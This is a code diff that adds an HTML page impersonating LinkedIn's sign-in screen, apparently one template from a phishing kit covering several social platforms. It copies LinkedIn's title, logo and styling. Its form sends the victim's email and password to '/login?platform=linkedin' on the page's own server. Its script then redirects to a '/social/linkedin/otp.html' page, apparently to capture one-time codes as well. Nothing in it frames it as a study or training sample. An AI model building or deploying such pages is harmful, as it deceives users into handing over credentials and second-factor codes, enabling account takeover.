@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LinkedIn Login, Sign in | LinkedIn</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", "Fira Sans", Ubuntu, Oxygen, "Oxygen Sans", Cantarell, "Droid Sans", "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Lucida Grande", Helvetica, Arial, sans-serif;
+        }
+        body {
+            background-color: #f3f2ef;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        .header {
+            padding: 24px 0;
+            width: 100%;
+            max-width: 1128px;
+            margin: 0 auto;
+        }
+        .logo {
+            width: 135px;
+            height: 34px;
+        }
+        .main {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            padding: 0 16px;
+        }
+        .container {
+            max-width: 400px;
+            width: 100%;
+            margin-top: 24px;
+        }
+        .card {
+            background-color: white;
+            border-radius: 8px;
+            padding: 24px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+        }
+        h1 {
+            font-size: 32px;
+            font-weight: 600;
+            line-height: 1.25;
+            margin-bottom: 8px;
+            color: rgba(0, 0, 0, 0.9);
+        }
+        .subtitle {
+            font-size: 14px;
+            line-height: 1.42857;
+            font-weight: 400;
+            color: rgba(0, 0, 0, 0.9);
+            margin-bottom: 24px;
+        }
+        .form-group {
+            margin-bottom: 12px;
+        }
+        .form-group label {
+            font-size: 14px;
+            font-weight: 600;
+            line-height: 1.5;
+            color: rgba(0, 0, 0, 0.75);
+            display: block;
+            margin-bottom: 4px;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            height: 48px;
+            padding: 0 16px;
+            border: 1px solid rgba(0, 0, 0, 0.6);
+            border-radius: 4px;
+            font-size: 16px;
+            line-height: 1.33333;
+            color: rgba(0, 0, 0, 0.9);
+            transition: border-color 0.15s ease-in-out;
+        }
+        input[type="text"]:focus, input[type="password"]:focus {
+            outline: none;
+            border-color: #0a66c2;
+            box-shadow: 0 0 0 1px #0a66c2;
+        }
+        .forgot-password {
+            color: #0a66c2;
+            font-size: 16px;
+            font-weight: 600;
+            text-decoration: none;
+            display: inline-block;
+            margin: 16px 0;
+        }
+        .forgot-password:hover {
+            text-decoration: underline;
+            color: #004182;
+        }
+        .signin-button {
+            width: 100%;
+            height: 52px;
+            background-color: #0a66c2;
+            color: white;
+            font-size: 16px;
+            font-weight: 600;
+            border: none;
+            border-radius: 28px;
+            cursor: pointer;
+            transition: background-color 0.15s ease-in-out;
+        }
+        .signin-button:hover {
+            background-color: #004182;
+        }
+        .divider {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            margin: 16px 0;
+        }
+        .divider::before, .divider::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid rgba(0, 0, 0, 0.15);
+        }
+        .divider span {
+            padding: 0 16px;
+            color: rgba(0, 0, 0, 0.6);
+            font-size: 14px;
+        }
+        .google-button {
+            width: 100%;
+            height: 40px;
+            background-color: white;
+            border: 1px solid rgba(0, 0, 0, 0.6);
+            border-radius: 28px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 16px;
+            font-weight: 600;
+            color: rgba(0, 0, 0, 0.75);
+            cursor: pointer;
+            margin-bottom: 8px;
+        }
+        .google-button:hover {
+            background-color: rgba(0, 0, 0, 0.04);
+            border-color: rgba(0, 0, 0, 0.9);
+        }
+        .join-now {
+            text-align: center;
+            margin-top: 32px;
+            font-size: 16px;
+            color: rgba(0, 0, 0, 0.9);
+        }
+        .join-now a {
+            color: #0a66c2;
+            font-weight: 600;
+            text-decoration: none;
+        }
+        .join-now a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <svg class="logo" viewBox="0 0 84 21" xmlns="http://www.w3.org/2000/svg">
+            <g>
+                <path fill="#0a66c2" d="M12.5 2.75a1.75 1.75 0 101.8 1.75 1.75 1.75 0 00-1.8-1.75zM11 8h3v10h-3zM22.34 8h-3.24v4.75A2.75 2.75 0 0116.35 15h-.1v3a5.49 5.49 0 005.38-5.38V8zM31.5 8h-3.24v4.75A2.75 2.75 0 0125.51 15h-.1v3a5.49 5.49 0 005.38-5.38V8zM45 8h-3v10h3zM43.5 2.75a1.75 1.75 0 101.75 1.75A1.75 1.75 0 0043.5 2.75zM37 8h-2.66v-3h-3V8h-2v3h2v4.75A2.75 2.75 0 0034.09 15h2.57v3h-2.57a5.49 5.49 0 01-5.38-5.38V11h-2V8h2V5h3v3H37zM82 14.25A2.75 2.75 0 0179.25 17H72a5.49 5.49 0 01-5.38-5.38V8h3v3.75A2.75 2.75 0 0172.37 14h6.38a5.49 5.49 0 005.38-5.38V8h3v6.25z"></path>
+            </g>
+        </svg>
+    </header>
+    <main class="main">
+        <div class="container">
+            <div class="card">
+                <h1>Sign in</h1>
+                <p class="subtitle">Stay updated on your professional world</p>
+                <form id="loginForm" method="POST" action="/login?platform=linkedin">
+                    <div class="form-group">
+                        <label for="email">Email or Phone</label>
+                        <input type="text" id="email" name="email" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="password">Password</label>
+                        <input type="password" id="password" name="password" required>
+                    </div>
+                    <a href="#" class="forgot-password">Forgot password?</a>
+                    <button type="submit" class="signin-button">Sign in</button>
+                </form>
+                <div class="divider">
+                    <span>or</span>
+                </div>
+                <button class="google-button">
+                    Sign in with Google
+                </button>
+            </div>
+            <div class="join-now">
+                New to LinkedIn? <a href="#">Join now</a>
+            </div>
+        </div>
+    </main>
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const formData = new FormData(this);
+            
+            fetch(this.action, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.status === 'success') {
+                    if (data.require_otp) {
+                        window.location.href = '/social/linkedin/otp.html';
+                    } else {
+                        window.location.href = data.redirect_url;
+                    }
+                } else {
+                    console.error('Error:', data.error);
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+        });
+    </script>
+</body>
+</html> 
